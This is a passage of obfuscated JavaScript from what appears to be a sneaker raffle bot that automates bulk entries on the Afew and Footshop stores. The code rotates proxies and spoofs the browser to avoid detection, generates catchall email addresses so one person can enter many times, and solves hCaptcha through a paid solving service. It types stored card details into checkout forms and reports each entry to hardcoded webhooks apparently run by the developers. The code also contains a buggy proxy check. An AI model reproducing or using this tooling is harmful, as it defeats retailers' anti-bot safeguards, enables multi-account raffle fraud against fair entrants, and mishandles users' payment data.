            _0x59e274['resourceType']() === 'image' || _0x59e274['resourceType']() === 'font' || _0x59e274['resourceType']() === 'media' ? _0x59e274['abort']() : _0x59e274['continue']();
        }), await _0x44e973['goto']('https://en.afew-store.com/collections/sneaker-raffles'), console['log'](_0x19564e() + '\x20[' + _0xc93d09[taskModule]['name'] + ']\x20Looking\x20for\x20Raffles'), await _0x44e973['waitForTimeout'](0xbb8), await _0x44e973['waitForSelector']('.product-card');
        const _0x4019d5 = await _0x44e973['$$eval']('a.product-card', _0x308ea9 => {
            return _0x308ea9['map'](_0x1cc7df => _0x1cc7df['href']);
        });
        return _0x102540 = _0x4019d5;
    } catch (_0x34d435) {
        console['log']('\x20' + _0x34d435);
    } finally {
        _0x5da1a8['close'](), console['clear']();
    }
}
;
async function _0x36d9a6(_0x1f8014, _0x1c696c, _0x5be65c, _0x213aa6, _0x3bd774) {
    _0x1c696c != 'ver' && await _0x423f7e(_0x213aa6, _0x1f8014);
    if (_0x13b92f['useRandomProxy'] = ![])
        var _0x3024c3 = _0x3bd774[_0x1f8014]['split'](':');
    else
        var _0x175ee5 = Math['round'](Math['random']() * (_0x3bd774['length'] - 0x1)), _0x3024c3 = _0x3bd774[_0x175ee5]['split'](':');
    var _0x21a109 = _0x5be65c['data'];
    _0x1c696c != 'ver' && (_0x21a109['data']['attributes']['properties']['$first_name'] = '' + _0x213aa6[_0x1f8014]['FirstName'], _0x21a109['data']['attributes']['properties']['$last_name'] = '' + _0x213aa6[_0x1f8014]['LastName'], _0x21a109['data']['attributes']['properties']['$address1'] = _0x213aa6[_0x1f8014]['Address1'] + '\x20' + _0x213aa6[_0x1f8014]['HouseNumber'] + '\x20' + _0x213aa6[_0x1f8014]['Address2'], _0x21a109['data']['attributes']['properties']['$zip'] = '' + _0x213aa6[_0x1f8014]['Zip'], _0x21a109['data']['attributes']['properties']['$city'] = '' + _0x213aa6[_0x1f8014]['City'], _0x21a109['data']['attributes']['properties']['$country'] = '' + _0x213aa6[_0x1f8014]['Country'], _0x21a109['data']['attributes']['properties']['Size'] = '' + _0x213aa6[_0x1f8014]['Size'], _0x21a109['data']['attributes']['properties']['Instagram\x20Handle'] = '' + _0x213aa6[_0x1f8014]['Follower'], _0x1c696c == 'exp' ? _0x21a109['data']['attributes']['email'] = '' + _0x213aa6[_0x1f8014]['FirstName'] + _0x213aa6[_0x1f8014]['LastName'] + _0x13b92f['catchall'] : _0x21a109['data']['attributes']['email'] = '' + _0x213aa6[_0x1f8014]['Email']);
    var _0x34e22e = {
        'jar': _0x599249,
        'followAllRedirects': !![],
        'method': 'POST',
        'url': _0x5be65c['url'],
        'headers': _0x5be65c['headers'],
        'body': JSON['stringify'](_0x21a109),
        'proxy': 'http://' + _0x3024c3[0x2] + ':' + _0x3024c3[0x3] + '@' + _0x3024c3[0x0] + ':' + _0x3024c3[0x1]
    };
    return _0x1c696c === 'ver' && (_0x34e22e['method'] = 'GET'), new Promise(function (_0x1bcaf0, _0x5c26ce) {
        callback = async (_0x3b326c, _0x394364, _0x4ceaf1) => {
            if (!_0x3b326c && _0x394364['statusCode'] == 0xca || !_0x3b326c && _0x394364['statusCode'] == 0xc8) {
                _0x1bcaf0(console['log'](_0x304ca1['green'](_0x19564e() + '\x20[' + _0x5be65c['name'] + ']\x20Task\x20' + (_0x1f8014 + 0x1) + ':\x20Raffle\x20Entered!')));
                if (_0x1c696c != 'ver') {
                    var _0x55429f = await _0x83146(_0x213aa6[_0x1f8014], _0x5be65c, 'dev', ![]), _0x897ad3 = await _0x83146(_0x213aa6[_0x1f8014], _0x5be65c, 'pub', ![]);
                    const _0x3bbda2 = {
                        'succesDEVMSG': { 'embeds': [_0x55429f] },
                        'succesPUBMSG': { 'embeds': [_0x897ad3] }
                    };
                    if (_0x13b92f['webhook'] != undefined && _0x13b92f['webhook'] != '')
                        try {
                            await _0xdeed(_0x13b92f['webhook'], _0x3bbda2['succesDEVMSG']);
                        } catch {
                        }
                    await _0x19d76a(0xc8), await _0xdeed(_0x25855c, _0x3bbda2['succesDEVMSG']), await _0x19d76a(0xc8);
                    try {
                        await _0xdeed(_0x4c8fbe, _0x3bbda2['succesPUBMSG']);
                    } catch {
                    }
                }
            } else {
                if (_0x1c696c != 'ver') {
                    var _0x5805b2 = '' + _0x3b326c, _0x5b9615 = await _0x83146(_0x213aa6[_0x1f8014], _0x5be65c, 'dev', !![], _0x5805b2), _0x5e9f4f = {};
                    _0x5e9f4f['errorDEV'] = { 'embeds': [_0x5b9615] }, _0x13b92f['webhook'] != undefined && _0x13b92f['webhook'] != '' && await _0xdeed(_0x13b92f['webhook'], _0x5e9f4f['errorDEV']), await _0xdeed(_0x192865, _0x5e9f4f['errorDEV']);
                }
                _0x5c26ce(console['log'](_0x19564e() + '\x20[' + _0x5be65c['name'] + ']\x20Task\x20' + (_0x1f8014 + 0x1) + ':\x20' + _0x3b326c));
            }
        };
        try {
            _0x1c696c === 'ver' ? console['log'](_0x19564e() + '\x20[' + _0x5be65c['name'] + ']\x20Task\x20' + (_0x1f8014 + 0x1) + ':\x20Verifying.') : console['log'](_0x19564e() + '\x20[' + _0x5be65c['name'] + ']\x20Task\x20' + (_0x1f8014 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x21a109['data']['attributes']['email']), _0x1b2891(_0x34e22e, callback);
        } catch (_0x4f1cfd) {
            console['log'](_0x19564e() + '\x20Task\x20' + (_0x1f8014 + 0x1) + ':\x20' + _0x4f1cfd);
        }
    });
}
;
async function _0x2c8d1f(_0x507c4f, _0x26b2b1, _0x1f0d12) {
    _0x3102e9['use'](_0x5c5e7a()), _0x3102e9['use'](_0x45477b({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x13b92f['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x270a27 = 0x0; _0x270a27 < _0x507c4f['length']; _0x270a27++) {
        var _0x583a7f, _0x4d49e1 = '', _0x548c66 = 0x0, _0x505e1e = [{
            'type': 'rich',
            'title': 'Succesful\x20Footshop\x20entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x17ac6d
                },
                {
                    'name': 'Product',
                    'value': '' + _0x507c4f[_0x270a27]['Url']
                },
                {
                    'name': 'Size',
                    'value': '' + _0x507c4f[_0x270a27]['Size']
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x13b92f['footshopDelay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x520c59
                }
            ]
        }], _0xe3d515 = await _0x83146(_0x507c4f[_0x270a27], _0x1f0d12, 'dev', ![]), _0x4ab607 = await _0x83146(_0x507c4f[_0x270a27], _0x1f0d12, 'pub', ![]);
        const _0x1ae72e = {
            'succesDEVMSG': { 'embeds': [_0xe3d515] },
            'succesPUBMSG': { 'embeds': [_0x4ab607] }
        }, _0xbc155c = { 'embeds': _0x505e1e };
        await _0x423f7e(_0x507c4f, _0x270a27);
        if (_0x507c4f[_0x270a27]['Email'] == '' || _0x507c4f[_0x270a27]['FirstName'] == '' || _0x507c4f[_0x270a27]['LastName'] == '' || _0x507c4f[_0x270a27]['Country'] == '' || _0x507c4f[_0x270a27]['Size'] == '' || _0x507c4f[_0x270a27]['Address1'] == '' || _0x507c4f[_0x270a27]['Zip'] == '') {
            console['log'](_0x19564e() + '\x20[' + _0x1f0d12['name'] + ']\x20Task\x20' + (_0x270a27 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0x507c4f[_0x270a27]['Email'] == '' || _0x507c4f[_0x270a27]['FirstName'] == '' || _0x507c4f[_0x270a27]['LastName'] == '' || _0x507c4f[_0x270a27]['Country'] == '' || _0x507c4f[_0x270a27]['Size'] == '' || _0x507c4f[_0x270a27]['Address1'] == '' || _0x507c4f[_0x270a27]['Zip'] == '' || _0x507c4f[_0x270a27]['Phone'] == '') {
            console['log'](_0x19564e() + '\x20[' + _0x1f0d12['name'] + ']\x20Task\x20' + (_0x270a27 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        const _0x37448e = '' + _0x507c4f[_0x270a27]['Url'];
        if (_0x13b92f['useRandomProxy'] = ![])
            var _0x5a374b = _0x26b2b1[_0x270a27]['split'](':');
        else
            var _0x7ed55c = Math['round'](Math['random']() * (_0x26b2b1['length'] - 0x1)), _0x5a374b = _0x26b2b1[_0x7ed55c]['split'](':');
        const _0x4190a7 = await _0x3102e9['launch']({
            'headless': !![],
            'args': ['--proxy-server=' + _0x5a374b[0x0] + ':' + _0x5a374b[0x1]]
        });
        try {
            const _0x53b598 = await _0x4190a7['newPage']();
            await _0x53b598['authenticate']({
                'username': '' + _0x5a374b[0x2],
                'password': '' + _0x5a374b[0x3]
            }), console['log'](_0x19564e() + '\x20[' + _0x1f0d12['name'] + ']\x20Task\x20' + (_0x270a27 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x53b598['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x53b598['setRequestInterception'](!![]), _0x53b598['on']('request', _0x5d5924 => {
                _0x5d5924['resourceType']() === 'image' || _0x5d5924['resourceType']() === 'font' || _0x5d5924['resourceType']() === 'media' ? _0x5d5924['abort']() : _0x5d5924['continue']();
            }), await _0x53b598['goto'](_0x37448e), await _0x19d76a(0xbb8), await _0x53b598['waitForSelector']('.control__JhutY'), await _0x53b598['click']('.control__JhutY'), await _0x19d76a(0x1f4);
            if (_0x507c4f[_0x270a27]['Size'] != 'RANDOM')
                try {
                    const _0x6f38ab = await _0x53b598['$x']('//div[contains(text(),\x20\x27' + _0x507c4f[_0x270a27]['Size'] + '\x27)]');
                    await _0x6f38ab[0x0]['click']();
                } catch {
                    console['log'](_0x304ca1['red'](_0x19564e() + '\x20[' + _0x1f0d12['name'] + ']\x20Task\x20' + (_0x270a27 + 0x1) + '\x20:\x20Size\x20Not\x20Found'));
                    continue;
                }
            else {
                const _0x501c00 = await _0x53b598['$$']('.options__3UQpT\x20>\x20div.row');
                var _0x2b09cc = Math['round'](Math['random']() * (_0x501c00['length'] - 0x1));
                await _0x501c00[_0x2b09cc]['click']();
            }
            await _0x19d76a(0x4b0);
            const _0x318603 = await _0x53b598['$x']('//span[contains(text(),\x20\x27Enter\x20raffle\x20now\x27)]');
            await _0x318603[0x0]['click'](), await _0x53b598['waitForSelector']('input[name=\x22email\x22]'), console['log'](_0x19564e() + '\x20[' + _0x1f0d12['name'] + ']\x20Task\x20' + (_0x270a27 + 0x1) + '\x20:\x20Filling\x20Entry\x20Credentials'), await _0x53b598['type']('input[name=\x22email\x22]', '' + _0x507c4f[_0x270a27]['Email']), await _0x19d76a(0x640), await _0x53b598['type']('input[name=\x22phone\x22]', '' + _0x507c4f[_0x270a27]['Phone']), await _0x19d76a(0x4b0), await _0x53b598['click']('button.btn.continue-button__1RtsS'), await _0x19d76a(0x4b0);
            try {
                await _0x53b598['type']('input[name=\x22firstName\x22]', '' + _0x507c4f[_0x270a27]['FirstName']), await _0x19d76a(0x258);
            } catch {
                const _0x42ac68 = await _0x53b598['$$eval']('.invalid-feedback\x20>\x20div', _0x35c3fc => {
                    return _0x35c3fc['map'](_0x1a7e64 => _0x1a7e64['innerText']);
                });
                console['log'](_0x304ca1['red'](_0x19564e() + '\x20[' + _0x1f0d12['name'] + ']\x20Task\x20' + (_0x270a27 + 0x1) + '\x20:\x20' + _0x42ac68));
                continue;
            }
            await _0x53b598['type']('input[name=\x22lastName\x22]', '' + _0x507c4f[_0x270a27]['LastName']), await _0x19d76a(0xc8), await _0x53b598['type']('input[name=\x22instagramUsername\x22]', '' + _0x507c4f[_0x270a27]['Follower']), await _0x19d76a(0x4b0), await _0x53b598['click']('button.btn.continue-button__1RtsS'), await _0x19d76a(0x3e8), console['log'](_0x19564e() + '\x20[' + _0x1f0d12['name'] + ']\x20Task\x20' + (_0x270a27 + 0x1) + '\x20:\x20Filling\x20Shipping'), await _0x53b598['select']('select[name=\x22country\x22]', '' + _0x507c4f[_0x270a27]['Country']), await _0x19d76a(0x2bc), await _0x53b598['type']('input[name=\x22streetName\x22]', '' + _0x507c4f[_0x270a27]['Address1']), await _0x19d76a(0x258), await _0x53b598['type']('input[name=\x22houseNumber\x22]', _0x507c4f[_0x270a27]['HouseNumber'] + '\x20' + _0x507c4f[_0x270a27]['Address2']), await _0x19d76a(0xc8), await _0x53b598['type']('input[name=\x22postalCode\x22]', '' + _0x507c4f[_0x270a27]['Zip']), await _0x19d76a(0x1f4), await _0x53b598['type']('input[name=\x22city\x22]', '' + _0x507c4f[_0x270a27]['City']), await _0x19d76a(0x4b0), await _0x53b598['click']('input[name=\x22consent::privacy-policy-101\x22]'), await _0x19d76a(0x4b0), await _0x53b598['click']('button.btn.continue-button__1RtsS'), await _0x19d76a(0x4b0), console['log'](_0x19564e() + '\x20[' + _0x1f0d12['name'] + ']\x20Task\x20' + (_0x270a27 + 0x1) + '\x20:\x20Solving\x20hCaptcha'), await _0x53b598['solveRecaptchas'](), console['log'](_0x19564e() + '\x20[' + _0x1f0d12['name'] + ']\x20Task\x20' + (_0x270a27 + 0x1) + '\x20:\x20hCaptcha\x20solved'), await _0x19d76a(0xbb8), await _0x53b598['click']('button.btn.continue-button__1RtsS'), await _0x19d76a(0x1388), console['log'](_0x19564e() + '\x20[' + _0x1f0d12['name'] + ']\x20Task\x20' + (_0x270a27 + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0x53b598['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x53b598['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x19d76a(0x4b0), await _0x53b598['type']('span[data-cse=\x22encryptedCardNumber\x22]', '' + _0x507c4f[_0x270a27]['CardNumber']), await _0x19d76a(0x320), await _0x53b598['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x53b598['type']('span[data-cse=\x22encryptedExpiryDate\x22]', '' + _0x507c4f[_0x270a27]['ExpiryDate']), await _0x19d76a(0x4b0), await _0x53b598['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x53b598['type']('span[data-cse=\x22encryptedSecurityCode\x22]', '' + _0x507c4f[_0x270a27]['CVV']), await _0x19d76a(0x226), await _0x53b598['type']('input[name=\x22holderName\x22]', '' + _0x507c4f[_0x270a27]['NameOnCard']), await _0x19d76a(0x226), await _0x53b598['click']('button.adyen-checkout__button'), console['log'](_0x19564e() + '\x20[' + _0x1f0d12['name'] + ']\x20Task\x20' + (_0x270a27 + 0x1) + '\x20:\x20Awaiting\x203DS');
            try {
                await _0x53b598['waitForSelector']('.thank-you__1AwOo', { 'timeout': 0x493e0 }), await _0x19d76a(0xbb8);
            } catch (_0x139520) {
                console['log'](_0x304ca1['red'](_0x19564e() + '\x20[' + _0x1f0d12['name'] + ']\x20Task\x20' + (_0x270a27 + 0x1) + '\x20:\x203DS\x20Failed')), _0x583a7f = '3DS\x20Error\x20' + _0x139520;
                var _0xb8ec78 = await _0x83146(_0x507c4f[_0x270a27], _0x1f0d12, 'dev', !![], _0x583a7f);
                _0x1ae72e['errorDEV'] = { 'embeds': [_0xb8ec78] };
                _0x13b92f['webhook'] != undefined && _0x13b92f['webhook'] != '' && await _0xdeed(_0x13b92f['webhook'], _0x1ae72e['errorDEV']);
                await _0xdeed(_0x192865, _0x1ae72e['errorDEV']);
                continue;
            }
            console['log'](_0x304ca1['green'](_0x19564e() + '\x20[' + _0x1f0d12['name'] + ']\x20Task\x20' + (_0x270a27 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
            if (_0x13b92f['webhook'] != undefined && _0x13b92f['webhook'] != '')
                try {
                    await _0xdeed(_0x13b92f['webhook'], _0x1ae72e['succesDEVMSG']);
                } catch {
                }
            await _0x19d76a(0xc8), await _0xdeed(_0x25855c, _0x1ae72e['succesDEVMSG']), await _0x19d76a(0xc8);
            try {
                await _0xdeed(_0x4c8fbe, _0x1ae72e['succesPUBMSG']);
            } catch {
            }
        } catch (_0x3d2b08) {
            console['log'](_0x19564e() + '\x20[' + _0x1f0d12['name'] + ']\x20Task\x20' + (_0x270a27 + 0x1) + '\x20:\x20' + _0x3d2b08), _0x583a7f = '' + _0x3d2b08;
            var _0xb8ec78 = await _0x83146(_0x507c4f[_0x270a27], _0x1f0d12, 'dev', !![], _0x583a7f);
            _0x1ae72e['errorDEV'] = { 'embeds': [_0xb8ec78] }, _0x13b92f['webhook'] != undefined && _0x13b92f['webhook'] != '' && await _0xdeed(_0x13b92f['webhook'], _0x1ae72e['errorDEV']), await _0xdeed(_0x192865, _0x1ae72e['errorDEV']), _0x4d49e1 = 'yes';
        } finally {
            _0x4190a7['close']();
            if (_0x4d49e1 == 'yes' && _0x548c66 != 0x5) {
                console['log'](_0x304ca1['red'](_0x19564e() + '\x20[' + _0x1f0d12['name'] + ']\x20Task\x20' + (_0x270a27 + 0x1) + '\x20:\x20Retrying')), _0x270a27 = _0x270a27 - 0x1, _0x548c66 = _0x548c66 + 0x1;
                continue;
            }
            console['log']('Waiting\x20for\x20' + _0x13b92f['footshopDelay'] + '\x20ms'), await _0x19d76a(_0x13b92f['footshopDelay']);
        }
    }
}
afewFunction = async (_0x45cb61, _0x35b650, _0x15df14, _0x3db0ff, _0x45f3c8) => {
    for (var _0x5dbd5e = 0x0; _0x5dbd5e < _0x3db0ff['length']; _0x5dbd5e++) {
        _0x13b92f['AfewDelay'] = _0x13b92f['delay'];
        var _0xef3a76, _0x57b108 = '', _0x4fbdc6 = 0x0;
        _0x3db0ff[_0x5dbd5e]['Url'] = _0x45cb61, _0x4bc62a(_0x15df14['name'] + '\x20Task\x20' + (_0x5dbd5e + 0x1) + '\x20/\x20' + _0x3db0ff['length'] + '\x20||\x20File:\x20' + _0x5ece83 + '\x20Proxies:\x20' + _0x286bb6), await _0x423f7e(_0x3db0ff, _0x5dbd5e);
        var _0x355c26 = await _0x83146(_0x3db0ff[_0x5dbd5e], _0x15df14, 'dev', ![]), _0x5a218d = await _0x83146(_0x3db0ff[_0x5dbd5e], _0x15df14, 'pub', ![]);
        const _0x23c8ad = {
            'succesDEVMSG': { 'embeds': [_0x355c26] },
            'succesPUBMSG': { 'embeds': [_0x5a218d] }
        };
        if (_0x3db0ff[_0x5dbd5e]['Email'] == '' || _0x3db0ff[_0x5dbd5e]['FirstName'] == '' || _0x3db0ff[_0x5dbd5e]['LastName'] == '' || _0x3db0ff[_0x5dbd5e]['Country'] == '' || _0x3db0ff[_0x5dbd5e]['Size'] == '' || _0x3db0ff[_0x5dbd5e]['Address1'] == '' || _0x3db0ff[_0x5dbd5e]['Zip'] == '') {
            console['log'](_0x19564e() + '\x20[' + _0x15df14['name'] + ']\x20Task\x20' + (_0x5dbd5e + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0x13b92f['useRandomProxy'] = ![])
            var _0x112834 = _0x45f3c8[_0x5dbd5e]['split'](':');
        else
            var _0x789aa1 = Math['round'](Math['random']() * (_0x45f3c8['length'] - 0x1)), _0x112834 = _0x45f3c8[_0x789aa1]['split'](':');
        const _0x5699c6 = await _0x3102e9['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x112834[0x0] + ':' + _0x112834[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x4c96cd = await _0x5699c6['newPage']();
            await _0x4c96cd['setDefaultNavigationTimeout'](0x1d4c0), await _0x4c96cd['authenticate']({
                'username': '' + _0x112834[0x2],
                'password': '' + _0x112834[0x3]
            }), console['log'](_0x19564e() + '\x20[' + _0x15df14['name'] + ']\x20Task\x20' + (_0x5dbd5e + 0x1) + '\x20:\x20Getting\x20Session'), await _0x4c96cd['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x4c96cd['setRequestInterception'](!![]), _0x4c96cd['on']('request', _0x3af25c => {
                _0x3af25c['resourceType']() === 'image' || _0x3af25c['resourceType']() === 'font' || _0x3af25c['resourceType']() === 'media' ? _0x3af25c['abort']() : _0x3af25c['continue']();
            }), await _0x4c96cd['goto'](_0x45cb61, { 'waitUntil': 'networkidle2' }), console['log'](_0x19564e() + '\x20[' + _0x15df14['name'] + ']\x20Task\x20' + (_0x5dbd5e + 0x1) + '\x20:\x20Gathering\x20cookies'), await _0x4c96cd['waitForTimeout'](0xfa0), console['log'](_0x19564e() + '\x20[' + _0x15df14['name'] + ']\x20Task\x20' + (_0x5dbd5e + 0x1) + '\x20:\x20Cookies\x20received'), await _0x4c96cd['waitForTimeout'](0x320);
            if (_0x3db0ff[_0x5dbd5e]['Size'] == 'RANDOM') {
                console['log'](_0x19564e() + '\x20[' + _0x15df14['name'] + ']\x20Task\x20' + (_0x5dbd5e + 0x1) + '\x20:\x20Choosing\x20random\x20size');
                const _0x7d601 = await _0x4c96cd['$$eval']('div.size-picker.mt-2\x20>\x20ul\x20>\x20li\x20>\x20a', _0x3c6680 => {
                    return _0x3c6680['map'](_0x35e36b => _0x35e36b['href']);
                });
                var _0x37248a = Math['round'](Math['random']() * (_0x7d601['length'] - 0x1));
                await _0x4c96cd['goto']('' + _0x7d601[_0x37248a]);
            } else {
                console['log'](_0x19564e() + '\x20[' + _0x15df14['name'] + ']\x20Task\x20' + (_0x5dbd5e + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x3db0ff[_0x5dbd5e]['Size']);
                try {
                    const _0x39ab52 = await _0x4c96cd['$$eval']('li[data-original-title=\x22Größe\x20in\x20EU:\x20' + _0x3db0ff[_0x5dbd5e]['Size'] + '\x22]\x20>\x20a', _0x35e353 => {
                        return _0x35e353['map'](_0x56d465 => _0x56d465['href']);
                    });
                    await _0x4c96cd['goto']('' + _0x39ab52[0x0], { 'waitUntil': 'networkidle2' });
                } catch (_0x22f938) {
                    console['log'](_0x304ca1['red'](_0x19564e() + '\x20[' + _0x15df14['name'] + ']\x20Task\x20' + (_0x5dbd5e + 0x1) + '\x20:\x20' + _0x22f938 + '\x20Size\x20not\x20found')), _0xef3a76 = 'Size\x20Not\x20Found';
                    var _0x46cd2c = await _0x83146(_0x3db0ff[_0x5dbd5e], _0x15df14, 'dev', !![], _0xef3a76);
                    _0x23c8ad['errorDEV'] = { 'embeds': [_0x46cd2c] };
                    _0x13b92f['webhook'] != undefined && _0x13b92f['webhook'] != '' && await _0xdeed(_0x13b92f['webhook'], _0x23c8ad['errorDEV']);
                    await _0xdeed(_0x192865, _0x23c8ad['errorDEV']);
                    continue;
                }
            }
            await _0x4c96cd['waitForTimeout'](0x258), await _0x4c96cd['type']('#raffle-instagram', '' + _0x3db0ff[_0x5dbd5e]['Follower'], { 'delay': 0x64 }), await _0x4c96cd['waitForTimeout'](0x384), await _0x4c96cd['click']('#raffle-terms'), await _0x4c96cd['waitForTimeout'](0x384), await _0x4c96cd['evaluate'](() => {
                const _0x3e0659 = document['querySelector']('button.btn[name=\x27add\x27]');
                _0x3e0659['click']();
            }), await _0x4c96cd['waitForTimeout'](0xbb8), await _0x4c96cd['waitForSelector']('#checkout_email'), await _0x19d76a(0x3e8), console['log'](_0x19564e() + '\x20[' + _0x15df14['name'] + ']\x20Task\x20' + (_0x5dbd5e + 0x1) + '\x20:\x20Filling\x20Information');
            _0x35b650 == 'sec' ? await _0x4c96cd['type']('#checkout_email', '' + _0x3db0ff[_0x5dbd5e]['FirstName'] + _0x3db0ff[_0x5dbd5e]['LastName'] + _0x13b92f['catchall'], 0x32) : await _0x4c96cd['type']('#checkout_email', '' + _0x3db0ff[_0x5dbd5e]['Email'], 0x32);
            await _0x19d76a(0x320), await _0x4c96cd['select']('#checkout_shipping_address_country', '' + _0x3db0ff[_0x5dbd5e]['Country']), await _0x4c96cd['waitForTimeout'](0x258), await _0x4c96cd['type']('#checkout_shipping_address_first_name', '' + _0x3db0ff[_0x5dbd5e]['FirstName']), await _0x4c96cd['waitForTimeout'](0x320), await _0x4c96cd['type']('#checkout_shipping_address_last_name', '' + _0x3db0ff[_0x5dbd5e]['LastName']), await _0x4c96cd['waitForTimeout'](0x2bc), await _0x4c96cd['type']('#checkout_shipping_address_address1', _0x3db0ff[_0x5dbd5e]['Address1'] + '\x20' + _0x3db0ff[_0x5dbd5e]['HouseNumber']), await _0x4c96cd['waitForTimeout'](0x2bc), await _0x4c96cd['type']('#checkout_shipping_address_address2', '' + _0x3db0ff[_0x5dbd5e]['Address2']), await _0x4c96cd['waitForTimeout'](0x2bc);
            _0x3db0ff[_0x5dbd5e]['Postcode'] == undefined ? await _0x4c96cd['type']('#checkout_shipping_address_zip', '' + _0x3db0ff[_0x5dbd5e]['Zip']) : await _0x4c96cd['type']('#checkout_shipping_address_zip', '' + _0x3db0ff[_0x5dbd5e]['Postcode']);
            await _0x4c96cd['waitForTimeout'](0x2bc), await _0x4c96cd['type']('#checkout_shipping_address_city', '' + _0x3db0ff[_0x5dbd5e]['City']), await _0x4c96cd['waitForTimeout'](0x2bc), console['log'](_0x19564e() + '\x20[' + _0x15df14['name'] + ']\x20Task\x20' + (_0x5dbd5e + 0x1) + '\x20:\x20Getting\x20Shipping'), await _0x4c96cd, _0x4c96cd['evaluate'](() => {
                const _0x5602be = document['querySelector']('#continue_button');
                for (var _0x5b422c = 0x0; _0x5b422c < 0x5; _0x5b422c++) {
                    if (_0x5602be) {
                        _0x5602be['click'](), _0x5602be['click']();
                        break;
                    } else
                        _0x19d76a(0xfa0);
                }
            }), await _0x4c96cd['waitForTimeout'](0x1194);
            try {
                await _0x4c96cd['waitForSelector']('div.radio-wrapper', { 'timeout': 0x186a0 });
            } catch {
                console['log'](_0x304ca1['red'](_0x19564e() + '\x20[' + _0x15df14['name'] + ']\x20Task\x20' + (_0x5dbd5e + 0x1) + '\x20:\x20Proxy\x20Error'));
                continue;
            }
            _0x4c96cd['evaluate'](() => {
                const _0x49aee9 = document['querySelector']('#continue_button');
                for (var _0x479b33 = 0x0; _0x479b33 < 0x5; _0x479b33++) {
                    if (_0x49aee9) {
                        _0x49aee9['click']();
                        break;
                    } else
                        _0x19d76a(0xfa0);
                }
            }), await _0x4c96cd['waitForTimeout'](0x7d0), console['log'](_0x19564e() + '\x20[' + _0x15df14['name'] + ']\x20Task\x20' + (_0x5dbd5e + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x4c96cd['waitForSelector']('#continue_button', { 'timeout': 0x186a0 }), _0x4c96cd['evaluate'](() => {
                const _0x285df4 = document['querySelector']('#continue_button');
                for (var _0x41264f = 0x0; _0x41264f < 0x5; _0x41264f++) {
                    if (_0x285df4) {
                        _0x285df4['click']();
                        break;
                    } else
                        _0x19d76a(0xfa0);
                }
            }), await _0x4c96cd['waitForTimeout'](0x1194), await _0x4c96cd['waitForSelector']('#continue_button'), _0x4c96cd['evaluate'](() => {
                const _0x425ef1 = document['querySelector']('#continue_button');
                for (var _0x442aad = 0x0; _0x442aad < 0x5; _0x442aad++) {
                    if (_0x425ef1) {
                        _0x425ef1['click']();
                        break;
                    } else
                        _0x19d76a(0xfa0);
                }
            });
            try {
                await _0x4c96cd['waitForSelector']('div[data-step=\x22thank_you\x22]'), console['log'](_0x304ca1['green'](_0x19564e() + '\x20[' + _0x15df14['name'] + ']\x20Task\x20' + (_0x5dbd5e + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                if (_0x13b92f['webhook'] != undefined && _0x13b92f['webhook'] != '')
                    try {
                        await _0xdeed(_0x13b92f['webhook'], _0x23c8ad['succesDEVMSG']);
                    } catch {
                    }
                await _0x19d76a(0xc8), await _0xdeed(_0x25855c, _0x23c8ad['succesDEVMSG']), await _0x19d76a(0xc8);
                try {
                    await _0xdeed(_0x4c8fbe, _0x23c8ad['succesPUBMSG']);
                } catch {
                }
            } catch (_0x30d71f) {
                console['log'](_0x304ca1['red'](_0x19564e() + '\x20[' + _0x15df14['name'] + ']\x20Task\x20' + (_0x5dbd5e + 0x1) + '\x20:\x20Entry\x20Failed:\x20' + _0x30d71f));
            }
        } catch (_0x2b8a22) {
            console['log'](_0x304ca1['red'](_0x19564e() + '\x20[' + _0x15df14['name'] + ']\x20Task\x20' + (_0x5dbd5e + 0x1) + '\x20:\x20' + _0x2b8a22)), _0xef3a76 = '' + _0x2b8a22;
            var _0x46cd2c = await _0x83146(_0x3db0ff[_0x5dbd5e], _0x15df14, 'dev', !![], _0xef3a76);
            _0x23c8ad['errorDEV'] = { 'embeds': [_0x46cd2c] }, _0x13b92f['webhook'] != undefined && _0x13b92f['webhook'] != '' && await _0xdeed(_0x13b92f['webhook'], _0x23c8ad['errorDEV']), await _0xdeed(_0x192865, _0x23c8ad['errorDEV']), _0x57b108 = 'yes';
        } finally {
            _0x5699c6 && _0x5699c6['close']();
            if (_0x57b108 == 'yes' && _0x4fbdc6 != 0x5 && _0xef3a76 != 'Size\x20Not\x20Found') {
                console['log'](_0x304ca1['red'](_0x19564e() + '\x20[' + _0x15df14['name'] + ']\x20Task\x20' + (_0x5dbd5e + 0x1) + '\x20:\x20Retrying')), _0x5dbd5e = _0x5dbd5e - 0x1, _0x4fbdc6 = _0x4fbdc6 + 0x1;
                continue;
            }
            if (_0x5dbd5e + 0x1 == _0x3db0ff['length']) {
                console['log'](_0x304ca1['green']('Finished\x20tasks,\x20returning\x20to\x20Main\x20Menu')), await _0x19d76a(0x7d0);
                break;
            }
            console['log']('Waiting\x20for\x20' + _0x13b92f['AfewDelay'] + '\x20ms'), await _0x19d76a(_0x13b92f['AfewDelay']);
        }
    }
};
